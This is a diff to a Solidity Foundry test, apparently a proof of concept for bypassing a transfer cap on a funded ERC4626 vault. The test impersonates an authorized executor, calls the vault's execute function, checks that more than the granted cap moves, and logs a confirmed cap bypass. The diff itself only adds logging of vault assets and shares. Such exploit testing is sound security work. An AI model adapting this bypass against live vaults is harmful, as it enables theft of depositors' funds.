@@ -6,6 +6,7 @@ import {Test} from "forge-std/Test.sol";
 import {FuseAction} from "../../src/interfaces/CurveYieldPhase2Interfaces.sol";
 import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
 import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import {IERC4626} from "@openzeppelin/contracts/interfaces/IERC4626.sol";
 import {CurveYieldMorphoLoopController} from "../../src/morpho/CurveYieldMorphoLoopController.sol";
 import {CyLoopEnv} from "../../src/morpho/CurveYieldMorphoLoopLib.sol";
 import {CurveYieldConfigKeys as K} from "../../src/governance/CurveYieldGateConfig.sol";
@@ -541,6 +542,8 @@ contract AttackerRealVaultFundedTransfer_v1 is Test {
             return;
         }
         emit log_named_address("actual_authorized_vault_executor", alpha);
+        emit log_named_uint("actual_vault_total_assets_before", IERC4626(VAULT).totalAssets());
+        emit log_named_uint("actual_vault_total_shares_before", IERC20(VAULT).totalSupply());
         vm.prank(alpha);
         (bool executed, bytes memory data) = VAULT.call(abi.encodeCall(ILiveVaultExposure.execute,(actions)));
         emit log_named_string("actual_funded_vault_fuse_execute", executed ? "SUCCESS" : "BLOCKED");
@@ -557,6 +560,8 @@ contract AttackerRealVaultFundedTransfer_v1 is Test {
         emit log_named_uint("actual_transfer_cap",1);
         emit log_named_uint("actual_vault_debit",sent);
         emit log_named_uint("actual_safe_credit",recieved);
+        emit log_named_uint("actual_vault_total_assets_after", IERC4626(VAULT).totalAssets());
+        emit log_named_uint("actual_vault_total_shares_after", IERC20(VAULT).totalSupply());
         assertEq(sent,recieved,"authentic vault debit matches real asset recipient");
         assertGt(sent,1,"actual configured real vault transfer exceeds granted cap");
         emit log_string("CONFIRMED_ACTUAL_FUNDED_IPOR_VAULT_FUSE_CAP_BYPASS");
